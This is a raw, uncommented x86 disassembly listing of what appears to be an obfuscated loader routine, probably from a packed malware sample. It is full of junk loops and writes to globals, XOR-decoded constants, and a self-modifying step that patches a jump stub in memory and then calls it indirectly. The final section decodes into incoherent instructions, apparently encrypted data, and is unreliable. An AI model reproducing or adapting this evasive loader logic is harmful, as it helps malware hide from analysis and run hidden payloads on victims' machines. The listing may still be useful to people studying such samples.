  40e6ec:	push   esi
  40e6ed:	inc    DWORD PTR ds:0x434647
  40e6f3:	push   edi
  40e6f4:	and    DWORD PTR ds:0x43463b,0x6624
  40e6fe:	push   0x414c56
  40e703:	adc    DWORD PTR ds:0x434603,0x6b43
  40e70d:	call   DWORD PTR ds:0x41340c
  40e713:	test   eax,eax
  40e715:	mov    DWORD PTR ds:0x434637,0x267
  40e71f:	je     0x40e741
  40e725:	adc    DWORD PTR ds:0x4346c7,0x4345df
  40e72f:	xor    eax,eax
  40e731:	inc    eax
  40e732:	mov    DWORD PTR ds:0x4345eb,0x5274
  40e73c:	jmp    0x40f150
  40e741:	add    DWORD PTR ds:0x43463b,ecx
  40e747:	mov    DWORD PTR [ebp-0x24],0xf89c8536
  40e74e:	and    DWORD PTR ds:0x4346d3,0x0
  40e758:	jmp    0x40e76a
  40e75d:	mov    edi,DWORD PTR ds:0x4346d3
  40e763:	inc    edi
  40e764:	mov    DWORD PTR ds:0x4346d3,edi
  40e76a:	cmp    DWORD PTR ds:0x4346d3,0x16
  40e771:	jae    0x40e855
  40e777:	cmp    DWORD PTR ds:0x4346d3,0xd
  40e77e:	jne    0x40e79e
  40e784:	push   0x4345eb
  40e789:	push   0x6202
  40e78e:	push   0x434788
  40e793:	push   0x434871
  40e798:	call   DWORD PTR ds:0x413344
  40e79e:	cmp    DWORD PTR ds:0x4346d3,0xc
  40e7a5:	jne    0x40e7b8
  40e7ab:	mov    edi,DWORD PTR ds:0x4346d3
  40e7b1:	inc    edi
  40e7b2:	mov    DWORD PTR ds:0x4346d3,edi
  40e7b8:	jmp    0x40e75d
  40e7bd:	and    DWORD PTR ds:0x43467b,0x0
  40e7c7:	jmp    0x40e7d9
  40e7cc:	mov    edi,DWORD PTR ds:0x43467b
  40e7d2:	inc    edi
  40e7d3:	mov    DWORD PTR ds:0x43467b,edi
  40e7d9:	cmp    DWORD PTR ds:0x43467b,0x11
  40e7e0:	jae    0x40e855
  40e7e6:	cmp    DWORD PTR ds:0x43467b,0x1c
  40e7ed:	jne    0x40e806
  40e7f3:	push   0x43491f
  40e7f8:	push   DWORD PTR [ebp-0x24]
  40e7fb:	push   0x501d
  40e800:	call   DWORD PTR ds:0x413348
  40e806:	jmp    0x40e7cc
  40e80b:	mov    DWORD PTR ds:0x43463b,0x17
  40e815:	cmp    DWORD PTR ds:0x43463b,0x0
  40e81c:	je     0x40e855
  40e822:	cmp    DWORD PTR ds:0x43463b,0x24
  40e829:	jne    0x40e83d
  40e82f:	push   0x3379
  40e834:	push   DWORD PTR [ebp-0x24]
  40e837:	call   DWORD PTR ds:0x4130c8
  40e83d:	mov    ecx,DWORD PTR ds:0x43463b
  40e843:	dec    ecx
  40e844:	mov    DWORD PTR ds:0x43463b,ecx
  40e84a:	jmp    0x40e815
  40e84f:	sub    DWORD PTR ds:0x43468b,edx
  40e855:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  40e85c:	sbb    DWORD PTR ds:0x4346bf,0x434607
  40e866:	lea    eax,[ebp-0x2c]
  40e869:	movzx  ecx,BYTE PTR ds:0x4345f3
  40e870:	and    ecx,DWORD PTR ds:0x4346cf
  40e876:	mov    DWORD PTR ds:0x4345f3,ecx
  40e87c:	mov    DWORD PTR [ebp-0x18],eax
  40e87f:	mov    DWORD PTR ds:0x434647,0x13
  40e889:	cmp    DWORD PTR ds:0x434647,0x0
  40e890:	je     0x40e94f
  40e896:	cmp    DWORD PTR ds:0x434647,0x3
  40e89d:	jne    0x40e8b6
  40e8a3:	push   0x8243
  40e8a8:	push   0x5b51
  40e8ad:	push   DWORD PTR [ebp-0x18]
  40e8b0:	call   DWORD PTR ds:0x4130cc
  40e8b6:	cmp    DWORD PTR ds:0x434647,0x4
  40e8bd:	jne    0x40e8d0
  40e8c3:	mov    esi,DWORD PTR ds:0x434647
  40e8c9:	dec    esi
  40e8ca:	mov    DWORD PTR ds:0x434647,esi
  40e8d0:	xor    esi,esi
  40e8d2:	add    esi,DWORD PTR ds:0x434647
  40e8d8:	dec    esi
  40e8d9:	mov    DWORD PTR ds:0x434647,esi
  40e8df:	jmp    0x40e889
  40e8e4:	and    DWORD PTR ds:0x43467b,0x0
  40e8ee:	jmp    0x40e900
  40e8f3:	mov    edi,DWORD PTR ds:0x43467b
  40e8f9:	inc    edi
  40e8fa:	mov    DWORD PTR ds:0x43467b,edi
  40e900:	cmp    DWORD PTR ds:0x43467b,0x19
  40e907:	jae    0x40e94f
  40e90d:	cmp    DWORD PTR ds:0x43467b,0xd
  40e914:	jne    0x40e92a
  40e91a:	push   0x6845
  40e91f:	push   0x4347f3
  40e924:	call   DWORD PTR ds:0x41334c
  40e92a:	cmp    DWORD PTR ds:0x43467b,0xc
  40e931:	jne    0x40e944
  40e937:	mov    edi,DWORD PTR ds:0x43467b
  40e93d:	inc    edi
  40e93e:	mov    DWORD PTR ds:0x43467b,edi
  40e944:	jmp    0x40e8f3
  40e949:	sub    DWORD PTR ds:0x43463f,edi
  40e94f:	lea    eax,[ebp-0x30]
  40e952:	mov    ecx,DWORD PTR ds:0x434687
  40e958:	adc    DWORD PTR ds:0x4346b7,ecx
  40e95e:	mov    DWORD PTR [ebp-0x14],eax
  40e961:	mov    esi,DWORD PTR ds:0x43461b
  40e967:	xor    ecx,ecx
  40e969:	or     ecx,DWORD PTR ds:0x434657
  40e96f:	sub    esi,ecx
  40e971:	or     esi,DWORD PTR [esi+ecx*1]
  40e974:	mov    eax,ds:0x414afe
  40e979:	mov    ebx,DWORD PTR ds:0x4346b3
  40e97f:	mov    ebx,DWORD PTR [ebx]
  40e981:	sub    DWORD PTR ds:0x4345ff,ebx
  40e987:	mov    eax,DWORD PTR [eax+0x1c8]
  40e98d:	mov    eax,DWORD PTR [eax]
  40e98f:	or     edi,0x2360
  40e995:	mov    ecx,DWORD PTR [ebp-0x14]
  40e998:	mov    esi,0x7510851
  40e99d:	and    DWORD PTR ds:0x434647,0x6472
  40e9a7:	xor    eax,esi
  40e9a9:	sbb    edi,DWORD PTR ds:0x4345fb
  40e9af:	mov    edi,0x327299
  40e9b4:	xor    DWORD PTR ds:0x4345fb,ebx
  40e9ba:	add    eax,edi
  40e9bc:	mov    DWORD PTR [ecx],eax
  40e9be:	mov    eax,ds:0x414dae
  40e9c3:	movzx  ebx,WORD PTR ds:0x4346f7
  40e9ca:	cmp    eax,0x22c02f45
  40e9cf:	mov    eax,DWORD PTR [ebp-0x4]
  40e9d2:	movzx  ebx,BYTE PTR ds:0x4346c7
  40e9d9:	mov    ebx,0xf89c853a
  40e9de:	je     0x40ea1a
  40e9e4:	sub    DWORD PTR ds:0x4346ff,edi
  40e9ea:	mov    ecx,DWORD PTR [ebp-0x24]
  40e9ed:	xor    eax,esi
  40e9ef:	add    eax,edi
  40e9f1:	sbb    DWORD PTR ds:0x434703,0x3fff
  40e9fb:	imul   eax,ecx
  40e9fe:	mov    DWORD PTR ds:0x4345f7,0x22e4
  40ea08:	mov    DWORD PTR [ebp-0x24],eax
  40ea0b:	mov    DWORD PTR ds:0x434647,0x3208
  40ea15:	jmp    0x40eab6
  40ea1a:	add    DWORD PTR ds:0x4346bf,0x154a
  40ea24:	xor    eax,esi
  40ea26:	sbb    DWORD PTR ds:0x434647,0x7bc1
  40ea30:	add    eax,edi
  40ea32:	mov    ds:0x414c12,eax
  40ea37:	movzx  eax,BYTE PTR ds:0x4346bb
  40ea3e:	sub    DWORD PTR ds:0x4346bf,eax
  40ea44:	mov    eax,DWORD PTR [ebp-0x24]
  40ea47:	xor    eax,esi
  40ea49:	adc    DWORD PTR ds:0x43468f,ebx
  40ea4f:	add    eax,edi
  40ea51:	not    ecx
  40ea53:	mov    ds:0x414dae,eax
  40ea58:	mov    eax,DWORD PTR [ebp-0x4]
  40ea5b:	mov    ecx,DWORD PTR ds:0x414c12
  40ea61:	xor    eax,esi
  40ea63:	xor    DWORD PTR ds:0x434603,0x4346c3
  40ea6d:	add    eax,edi
  40ea6f:	mov    DWORD PTR ds:0x43468b,0x4a46
  40ea79:	cmp    ecx,eax
  40ea7b:	jne    0x40eab6
  40ea81:	sbb    DWORD PTR ds:0x434603,0x43464f
  40ea8b:	push   ebx
  40ea8c:	mov    DWORD PTR ds:0x4346bf,0x49e8
  40ea96:	push   DWORD PTR [ebp-0x4]
  40ea99:	sbb    DWORD PTR ds:0x43463f,0x7dd1
  40eaa3:	push   DWORD PTR [ebp-0x24]
  40eaa6:	adc    DWORD PTR ds:0x4345ef,0x434603
  40eab0:	call   DWORD PTR ds:0x414c0a
  40eab6:	and    edx,DWORD PTR ds:0x434603
  40eabc:	mov    eax,ds:0x414afe
  40eac1:	mov    ecx,DWORD PTR ds:0x434693
  40eac7:	and    DWORD PTR ds:0x434643,ecx
  40eacd:	mov    eax,DWORD PTR [eax+0x18c]
  40ead3:	sub    ecx,edx
  40ead5:	mov    eax,DWORD PTR [eax]
  40ead7:	neg    ecx
  40ead9:	mov    DWORD PTR [ebp-0x44],eax
  40eadc:	mov    DWORD PTR [ebp-0x10],ebx
  40eadf:	sub    ecx,DWORD PTR ds:0x43470f
  40eae5:	mov    DWORD PTR [ebp-0x10],ebx
  40eae8:	and    DWORD PTR ds:0x43463f,0x0
  40eaf2:	jmp    0x40eb04
  40eaf7:	mov    ecx,DWORD PTR ds:0x43463f
  40eafd:	inc    ecx
  40eafe:	mov    DWORD PTR ds:0x43463f,ecx
  40eb04:	cmp    DWORD PTR ds:0x43463f,0x1d
  40eb0b:	jae    0x40eb61
  40eb11:	cmp    DWORD PTR ds:0x43463f,0x7
  40eb18:	jne    0x40eb2c
  40eb1e:	push   DWORD PTR [ebp-0x18]
  40eb21:	push   0x7577
  40eb26:	call   DWORD PTR ds:0x4130d0
  40eb2c:	cmp    DWORD PTR ds:0x43463f,0x6
  40eb33:	jne    0x40eb48
  40eb39:	xor    ecx,ecx
  40eb3b:	add    ecx,DWORD PTR ds:0x43463f
  40eb41:	inc    ecx
  40eb42:	mov    DWORD PTR ds:0x43463f,ecx
  40eb48:	jmp    0x40eaf7
  40eb4d:	xor    edx,edx
  40eb4f:	or     edx,DWORD PTR ds:0x434647
  40eb55:	sbb    edx,DWORD PTR ds:0x434707
  40eb5b:	mov    DWORD PTR ds:0x434647,edx
  40eb61:	mov    DWORD PTR [ebp-0x10],ebx
  40eb64:	mov    ecx,DWORD PTR ds:0x43470b
  40eb6a:	or     DWORD PTR ds:0x4346bb,ecx
  40eb70:	mov    DWORD PTR [ebp-0x14],0xf89c8536
  40eb77:	or     eax,edx
  40eb79:	mov    DWORD PTR [ebp-0x10],ebx
  40eb7c:	mov    DWORD PTR [ebp-0x10],0xf89c853e
  40eb83:	xor    ecx,DWORD PTR ds:0x434637
  40eb89:	mov    eax,DWORD PTR [ebp-0x24]
  40eb8c:	and    edx,0x522c
  40eb92:	mov    ecx,DWORD PTR [ebp-0x4]
  40eb95:	and    DWORD PTR ds:0x43470f,edx
  40eb9b:	mov    edx,DWORD PTR [ebp-0x4]
  40eb9e:	or     DWORD PTR ds:0x43470b,0x4346c7
  40eba8:	xor    edx,esi
  40ebaa:	sub    DWORD PTR ds:0x43464f,0x434607
  40ebb4:	xor    ecx,esi
  40ebb6:	adc    DWORD PTR ds:0x4346bf,0x4346fb
  40ebc0:	add    ecx,edx
  40ebc2:	mov    edx,DWORD PTR [ebp-0x4]
  40ebc5:	adc    DWORD PTR ds:0x4345f7,0x434677
  40ebcf:	xor    eax,esi
  40ebd1:	xor    edx,esi
  40ebd3:	adc    DWORD PTR ds:0x4345e3,0x6faf
  40ebdd:	add    eax,edi
  40ebdf:	mov    DWORD PTR ds:0x434683,0x13
  40ebe9:	lea    ecx,[ecx+edx*1+0x9757cb]
  40ebf0:	mov    DWORD PTR ds:0x43463b,0x74ca
  40ebfa:	mov    DWORD PTR [ebp-0x20],eax
  40ebfd:	mov    DWORD PTR ds:0x434643,0x777a
  40ec07:	cmp    eax,ecx
  40ec09:	mov    DWORD PTR ds:0x434713,0x6f86
  40ec13:	ja     0x40ed7b
  40ec19:	jmp    0x40ec27
  40ec1e:	adc    DWORD PTR ds:0x43467b,edi
  40ec24:	mov    eax,DWORD PTR [ebp-0x20]
  40ec27:	add    DWORD PTR ds:0x434703,0x32bd
  40ec31:	mov    ecx,DWORD PTR [ebp-0x4]
  40ec34:	xor    ecx,esi
  40ec36:	xor    DWORD PTR ds:0x4345e7,0x43468f
  40ec40:	lea    eax,[ecx+eax*1+0x327299]
  40ec47:	push   eax
  40ec48:	and    DWORD PTR ds:0x434693,0x0
  40ec52:	xor    eax,eax
  40ec54:	or     eax,DWORD PTR ds:0x434693
  40ec5a:	inc    eax
  40ec5b:	mov    ds:0x434693,eax
  40ec60:	cmp    DWORD PTR ds:0x434693,0x10
  40ec67:	jne    0x40ec76
  40ec6d:	push   DWORD PTR [ebp-0x1c]
  40ec70:	call   DWORD PTR ds:0x413350
  40ec76:	cmp    DWORD PTR ds:0x434693,0xf
  40ec7d:	jne    0x40ec91
  40ec83:	xor    eax,eax
  40ec85:	add    eax,DWORD PTR ds:0x434693
  40ec8b:	inc    eax
  40ec8c:	mov    ds:0x434693,eax
  40ec91:	cmp    DWORD PTR ds:0x434693,0x1c
  40ec98:	jb     0x40ec52
  40ec9e:	movzx  eax,BYTE PTR ds:0x4345e3
  40eca5:	adc    eax,DWORD PTR ds:0x43467b
  40ecab:	mov    ds:0x4345e3,eax
  40ecb0:	mov    eax,DWORD PTR [ebp-0x14]
  40ecb3:	xor    eax,esi
  40ecb5:	mov    DWORD PTR ds:0x43463f,0x3b17
  40ecbf:	lea    eax,[ebp+eax*1+0x3272a1]
  40ecc6:	sub    DWORD PTR ds:0x4346f7,0x434603
  40ecd0:	push   eax
  40ecd1:	and    eax,DWORD PTR ds:0x43467b
  40ecd7:	mov    eax,ds:0x414afe
  40ecdc:	adc    DWORD PTR ds:0x434637,0x7c2
  40ece6:	push   DWORD PTR [eax+0x1bc]
  40ecec:	call   0x4028d7
  40ecf1:	mov    eax,DWORD PTR [ebp-0x4]
  40ecf4:	mov    ecx,DWORD PTR [ebp-0x20]
  40ecf7:	mov    edx,DWORD PTR ds:0x4346fb
  40ecfd:	or     DWORD PTR ds:0x434713,edx
  40ed03:	xor    eax,esi
  40ed05:	lea    eax,[ecx+eax*1+0x327299]
  40ed0c:	mov    ecx,DWORD PTR [ebp-0x4]
  40ed0f:	or     DWORD PTR ds:0x434643,edi
  40ed15:	mov    edx,DWORD PTR [ebp-0x4]
  40ed18:	sub    DWORD PTR ds:0x434677,0x283f
  40ed22:	xor    edx,esi
  40ed24:	xor    DWORD PTR ds:0x4346d3,0x434637
  40ed2e:	xor    ecx,esi
  40ed30:	add    ecx,edx
  40ed32:	mov    edx,DWORD PTR [ebp-0x4]
  40ed35:	and    DWORD PTR ds:0x4346f7,0x4345ff
  40ed3f:	xor    edx,esi
  40ed41:	mov    DWORD PTR ds:0x434637,0x5401
  40ed4b:	lea    ecx,[ecx+edx*1+0x9757cb]
  40ed52:	mov    DWORD PTR ds:0x434607,0x25c8
  40ed5c:	mov    DWORD PTR [ebp-0x20],eax
  40ed5f:	mov    DWORD PTR ds:0x43463f,0x56d4
  40ed69:	cmp    eax,ecx
  40ed6b:	mov    DWORD PTR ds:0x434607,0x74b6
  40ed75:	jbe    0x40ec1e
  40ed7b:	mov    DWORD PTR ds:0x4346ff,0x4be2
  40ed85:	mov    eax,DWORD PTR [ebp+0xc]
  40ed88:	add    DWORD PTR ds:0x434707,edx
  40ed8e:	mov    ds:0x414982,eax
  40ed93:	mov    eax,DWORD PTR [ebp+0x10]
  40ed96:	mov    ds:0x414bd6,eax
  40ed9b:	and    DWORD PTR ds:0x4346c7,0x0
  40eda5:	mov    ecx,DWORD PTR ds:0x4346c7
  40edab:	inc    ecx
  40edac:	mov    DWORD PTR ds:0x4346c7,ecx
  40edb2:	cmp    DWORD PTR ds:0x4346c7,0x1f
  40edb9:	jne    0x40edca
  40edbf:	push   0x43495b
  40edc4:	call   DWORD PTR ds:0x413354
  40edca:	cmp    DWORD PTR ds:0x4346c7,0x13
  40edd1:	jb     0x40eda5
  40edd7:	add    ecx,eax
  40edd9:	mov    eax,ds:0x414982
  40edde:	inc    ecx
  40eddf:	mov    ecx,DWORD PTR [ebp-0x18]
  40ede2:	sub    DWORD PTR ds:0x43464f,0x1b10
  40edec:	push   DWORD PTR [ebp-0x44]
  40edef:	or     DWORD PTR ds:0x4346c3,0x4346f7
  40edf9:	sub    eax,edi
  40edfb:	sub    DWORD PTR ds:0x4345ff,0x4345ef
  40ee05:	push   DWORD PTR [ebp-0x30]
  40ee08:	adc    DWORD PTR ds:0x43463b,0x5064
  40ee12:	xor    eax,esi
  40ee14:	mov    DWORD PTR [ecx],eax
  40ee16:	push   DWORD PTR [ebp-0x2c]
  40ee19:	call   0x40f157
  40ee1e:	sub    eax,edi
  40ee20:	adc    ecx,DWORD PTR ds:0x4345ef
  40ee26:	xor    eax,esi
  40ee28:	mov    DWORD PTR ds:0x4345ff,0x13
  40ee32:	cmp    DWORD PTR ds:0x4345ff,0x0
  40ee39:	je     0x40ee7a
  40ee3f:	cmp    DWORD PTR ds:0x4345ff,0x18
  40ee46:	jne    0x40ee68
  40ee4c:	push   0x43495b
  40ee51:	push   DWORD PTR [ebp-0xc]
  40ee54:	push   DWORD PTR [ebp-0x28]
  40ee57:	push   DWORD PTR [ebp-0x1c]
  40ee5a:	push   DWORD PTR [ebp-0x20]
  40ee5d:	push   0x2408
  40ee62:	call   DWORD PTR ds:0x413358
  40ee68:	mov    ecx,DWORD PTR ds:0x4345ff
  40ee6e:	dec    ecx
  40ee6f:	mov    DWORD PTR ds:0x4345ff,ecx
  40ee75:	jmp    0x40ee32
  40ee7a:	mov    DWORD PTR [ebp+0xc],eax
  40ee7d:	mov    ecx,DWORD PTR [ebp-0x4]
  40ee80:	mov    eax,DWORD PTR [ebp+0xc]
  40ee83:	xor    ecx,esi
  40ee85:	add    ecx,edi
  40ee87:	xor    edx,edx
  40ee89:	div    ecx
  40ee8b:	mov    ecx,DWORD PTR [ebp-0x24]
  40ee8e:	cmp    ecx,eax
  40ee90:	jne    0x40f0b9
  40ee96:	mov    eax,ds:0x414afe
  40ee9b:	mov    DWORD PTR [ebp+0x10],eax
  40ee9e:	mov    eax,ds:0x414c0e
  40eea3:	mov    DWORD PTR [ebp-0x50],eax
  40eea6:	mov    DWORD PTR [ebp-0x18],0xf89c8536
  40eead:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  40eeb4:	mov    DWORD PTR [ebp-0x4c],0xf89cb536
  40eebb:	mov    DWORD PTR [ebp-0x64],0xf89f0536
  40eec2:	mov    DWORD PTR [ebp-0x60],0xf89c85f6
  40eec9:	mov    DWORD PTR [ebp-0x54],0xf89c85d6
  40eed0:	mov    eax,DWORD PTR [ebp-0x18]
  40eed3:	xor    eax,esi
  40eed5:	add    eax,edi
  40eed7:	mov    DWORD PTR [ebp-0xc],eax
  40eeda:	mov    DWORD PTR [ebp-0x3c],0xf89c853d
  40eee1:	mov    BYTE PTR [ebp-0x25],0x67
  40eee5:	mov    eax,DWORD PTR [ebp-0x18]
  40eee8:	xor    eax,esi
  40eeea:	add    eax,edi
  40eeec:	mov    DWORD PTR [ebp-0xc],eax
  40eeef:	mov    eax,DWORD PTR [ebp-0x54]
  40eef2:	xor    eax,esi
  40eef4:	add    eax,edi
  40eef6:	mov    DWORD PTR [ebp-0x40],eax
  40eef9:	mov    eax,DWORD PTR [ebp-0x4c]
  40eefc:	xor    eax,esi
  40eefe:	add    eax,edi
  40ef00:	mov    DWORD PTR [ebp-0x38],eax
  40ef03:	mov    eax,DWORD PTR [ebp-0x3c]
  40ef06:	xor    eax,esi
  40ef08:	add    eax,edi
  40ef0a:	mov    DWORD PTR [ebp-0x34],eax
  40ef0d:	lea    eax,[ebp-0xa8]
  40ef13:	mov    DWORD PTR [ebp+0xc],eax
  40ef16:	mov    eax,DWORD PTR [ebp-0x18]
  40ef19:	mov    DWORD PTR [ebp-0x14],eax
  40ef1c:	mov    eax,DWORD PTR [ebp-0x20]
  40ef1f:	mov    DWORD PTR [ebp-0x5c],ebx
  40ef22:	mov    DWORD PTR [ebp-0x10],eax
  40ef25:	mov    eax,DWORD PTR [ebp-0x5c]
  40ef28:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef2b:	xor    eax,esi
  40ef2d:	add    eax,0x327299
  40ef32:	mov    DWORD PTR [ecx],eax
  40ef34:	mov    eax,DWORD PTR [ebp-0x14]
  40ef37:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef3a:	xor    eax,esi
  40ef3c:	add    eax,edi
  40ef3e:	mov    DWORD PTR [ecx+0x4],eax
  40ef41:	mov    eax,DWORD PTR [ebp-0x34]
  40ef44:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef47:	mov    DWORD PTR [ecx+0x8],eax
  40ef4a:	mov    eax,DWORD PTR [ebp-0x38]
  40ef4d:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef50:	mov    DWORD PTR [ecx+0xc],eax
  40ef53:	mov    eax,DWORD PTR [ebp-0x40]
  40ef56:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef59:	mov    DWORD PTR [ecx+0x10],eax
  40ef5c:	mov    eax,eax
  40ef5e:	mov    eax,DWORD PTR [ebp-0x10]
  40ef61:	xor    eax,esi
  40ef63:	add    eax,edi
  40ef65:	je     0x40ef96
  40ef6b:	lea    eax,[ebp-0xa8]
  40ef71:	push   eax
  40ef72:	mov    eax,DWORD PTR [ebp-0x20]
  40ef75:	xor    eax,esi
  40ef77:	add    eax,edi
  40ef79:	push   eax
  40ef7a:	mov    eax,DWORD PTR [ebp+0x10]
  40ef7d:	add    eax,0xaa
  40ef82:	push   eax
  40ef83:	mov    eax,DWORD PTR [ebp+0x10]
  40ef86:	mov    eax,DWORD PTR [eax+0x198]
  40ef8c:	push   DWORD PTR [eax]
  40ef8e:	call   0x411333
  40ef93:	mov    DWORD PTR [ebp-0x8],eax
  40ef96:	cmp    DWORD PTR [ebp-0x8],0x0
  40ef9a:	je     0x40f0b9
  40efa0:	lea    eax,[ebp-0xc]
  40efa3:	mov    DWORD PTR [ebp-0x38],eax
  40efa6:	mov    eax,DWORD PTR [ebp-0x60]
  40efa9:	xor    eax,esi
  40efab:	add    eax,edi
  40efad:	mov    DWORD PTR [ebp-0x40],eax
  40efb0:	mov    eax,DWORD PTR [ebp-0x3c]
  40efb3:	xor    eax,esi
  40efb5:	add    eax,edi
  40efb7:	mov    DWORD PTR [ebp-0x10],eax
  40efba:	mov    eax,DWORD PTR [ebp-0x8]
  40efbd:	mov    DWORD PTR [ebp-0x14],eax
  40efc0:	lea    eax,[ebp-0xa8]
  40efc6:	mov    DWORD PTR [ebp+0xc],eax
  40efc9:	mov    eax,DWORD PTR [ebp-0x18]
  40efcc:	mov    DWORD PTR [ebp-0x18],eax
  40efcf:	mov    eax,DWORD PTR [ebp-0x20]
  40efd2:	mov    DWORD PTR [ebp-0x48],ebx
  40efd5:	mov    DWORD PTR [ebp-0x34],eax
  40efd8:	mov    eax,DWORD PTR [ebp-0x48]
  40efdb:	mov    ecx,DWORD PTR [ebp+0xc]
  40efde:	xor    eax,esi
  40efe0:	add    eax,0x327299
  40efe5:	mov    DWORD PTR [ecx],eax
  40efe7:	mov    eax,DWORD PTR [ebp-0x14]
  40efea:	mov    ecx,DWORD PTR [ebp+0xc]
  40efed:	mov    DWORD PTR [ecx+0x4],eax
  40eff0:	mov    eax,DWORD PTR [ebp-0x10]
  40eff3:	mov    ecx,DWORD PTR [ebp+0xc]
  40eff6:	mov    DWORD PTR [ecx+0x8],eax
  40eff9:	mov    eax,DWORD PTR [ebp-0x40]
  40effc:	mov    ecx,DWORD PTR [ebp+0xc]
  40efff:	mov    DWORD PTR [ecx+0xc],eax
  40f002:	mov    eax,DWORD PTR [ebp-0x38]
  40f005:	mov    ecx,DWORD PTR [ebp+0xc]
  40f008:	mov    DWORD PTR [ecx+0x10],eax
  40f00b:	mov    eax,eax
  40f00d:	mov    eax,DWORD PTR [ebp-0x14]
  40f010:	test   eax,eax
  40f012:	mov    eax,DWORD PTR [ebp-0x34]
  40f015:	jne    0x40f01e
  40f01b:	mov    eax,DWORD PTR [ebp-0x18]
  40f01e:	xor    eax,esi
  40f020:	add    eax,edi
  40f022:	test   eax,eax
  40f024:	je     0x40f052
  40f02a:	lea    eax,[ebp-0xa8]
  40f030:	push   eax
  40f031:	mov    eax,DWORD PTR [ebp-0x20]
  40f034:	xor    eax,esi
  40f036:	add    eax,edi
  40f038:	push   eax
  40f039:	mov    eax,DWORD PTR [ebp+0x10]
  40f03c:	add    eax,0xee
  40f041:	push   eax
  40f042:	mov    eax,DWORD PTR [ebp+0x10]
  40f045:	mov    eax,DWORD PTR [eax+0x198]
  40f04b:	push   DWORD PTR [eax]
  40f04d:	call   0x411333
  40f052:	mov    ecx,DWORD PTR [ebp-0x3c]
  40f055:	xor    ecx,esi
  40f057:	mov    eax,0xffcd8d67
  40f05c:	sub    eax,ecx
  40f05e:	sub    eax,DWORD PTR [ebp-0x8]
  40f061:	mov    ecx,DWORD PTR [ebp-0x50]
  40f064:	add    ecx,eax
  40f066:	mov    eax,DWORD PTR [ebp-0x8]
  40f069:	mov    DWORD PTR [eax+0x1],ecx
  40f06c:	mov    al,BYTE PTR [ebp-0x25]
  40f06f:	mov    ecx,DWORD PTR [ebp-0x8]
  40f072:	xor    al,0x44
  40f074:	sub    al,0x3a
  40f076:	mov    BYTE PTR [ecx],al
  40f078:	lea    eax,[ebp-0x8]
  40f07b:	inc    BYTE PTR [eax]
  40f07d:	inc    eax
  40f07e:	push   eax
  40f07f:	pop    ecx
  40f080:	dec    ecx
  40f081:	xchg   ecx,edx
  40f083:	dec    BYTE PTR [edx]
  40f085:	push   DWORD PTR [ebp+0x10]
  40f088:	mov    eax,ds:0x414bba
  40f08d:	mov    eax,DWORD PTR [eax]
  40f08f:	push   DWORD PTR [eax]
  40f091:	lea    eax,ds:0x414bd6
  40f097:	push   DWORD PTR [eax]
  40f099:	lea    eax,ds:0x414982
  40f09f:	push   DWORD PTR [eax]
  40f0a1:	lea    eax,ds:0x414bb6
  40f0a7:	push   DWORD PTR [eax]
  40f0a9:	lea    eax,ds:0x414cda
  40f0af:	push   DWORD PTR [eax]
  40f0b1:	xchg   ebx,edx
  40f0b3:	inc    ebx
  40f0b4:	push   ebx
  40f0b5:	pop    eax
  40f0b6:	call   DWORD PTR [eax-0x1]
  40f0b9:	lea    eax,[ebp+0x4]
  40f0bc:	mov    DWORD PTR [ebp-0x58],eax
  40f0bf:	mov    eax,ds:0x414afe
  40f0c4:	push   0x4
  40f0c6:	add    eax,0x1cc
  40f0cb:	push   eax
  40f0cc:	lea    eax,[ebp-0x1c]
  40f0cf:	push   eax
  40f0d0:	call   0x4028d7
  40f0d5:	mov    eax,DWORD PTR [ebp-0x1c]
  40f0d8:	mov    eax,DWORD PTR [ebp-0x4]
  40f0db:	mov    eax,DWORD PTR [ebp-0x24]
  40f0de:	mov    DWORD PTR [ebp+0xc],eax
  40f0e1:	mov    eax,ds:0x414b82
  40f0e6:	mov    ecx,DWORD PTR [ebp+0xc]
  40f0e9:	sub    eax,edi
  40f0eb:	xor    eax,esi
  40f0ed:	cmp    eax,ecx
  40f0ef:	je     0x40f136
  40f0f5:	mov    eax,ds:0x414b7a
  40f0fa:	mov    ecx,DWORD PTR [ebp+0xc]
  40f0fd:	sub    eax,edi
  40f0ff:	xor    eax,esi
  40f101:	cmp    eax,ecx
  40f103:	jne    0x40f119
  40f109:	mov    eax,ds:0x414b82
  40f10e:	add    eax,DWORD PTR ds:0x414b7a
  40f114:	jmp    0x40f120
  40f119:	mov    eax,DWORD PTR [ebp+0xc]
  40f11c:	xor    eax,esi
  40f11e:	add    eax,edi
  40f120:	mov    ds:0x414b7a,eax
  40f125:	mov    eax,DWORD PTR [ebp+0xc]
  40f128:	xor    eax,esi
  40f12a:	add    eax,edi
  40f12c:	mov    ds:0x414b82,eax
  40f131:	jmp    0x40f140
  40f136:	mov    eax,ds:0x414b82
  40f13b:	mov    ds:0x414b7a,eax
  40f140:	mov    eax,DWORD PTR [ebp-0x58]
  40f143:	mov    ecx,DWORD PTR ds:0x414b7a
  40f149:	add    DWORD PTR [eax],ecx
  40f14b:	mov    eax,DWORD PTR [ebp-0x1c]
  40f14e:	mov    eax,DWORD PTR [eax]
  40f150:	pop    edi
  40f151:	pop    esi
  40f152:	pop    ebx
  40f153:	leave  
  40f154:	ret    0xc
  40f157:	push   ebp
  40f158:	mov    ebp,esp
  40f15a:	jmp    0x40f4ed
  40f15f:	repz call 0x655e557a
  40f165:	jae    0x40f1d8
  40f167:	hlt    
  40f168:	aaa    
  40f169:	scas   eax,DWORD PTR es:[edi]
  40f16a:	aad    0xee
  40f16c:	shr    dl,cl
  40f16e:	push   0x20
  40f170:	mov    dh,0x7e
  40f172:	jle    0x40f168
  40f174:	jns    0x40f1f4
  40f176:	jle    0x40f141
  40f178:	mov    ds:0x480d13e3,eax
  40f17d:	add    ebp,DWORD PTR [edx-0xd]
  40f180:	lock or al,0x96
  40f183:	bnd jmp 0xf481a640
  40f189:	pusha  
  40f18a:	xchg   ebx,eax
  40f18b:	adc    ecx,esi
  40f18d:	pop    ss
  40f18e:	inc    ebp
  40f18f:	in     al,0x14
  40f191:	sub    ebx,DWORD PTR [ebp-0x40]
  40f194:	sub    eax,0x439054d6
  40f199:	mov    ds:0x4d1acea5,al
  40f19e:	inc    ebx
  40f19f:	rol    BYTE PTR [edi+0x2f],1
  40f1a2:	ins    DWORD PTR es:[edi],dx
  40f1a3:	ret    
  40f1a4:	out    dx,al
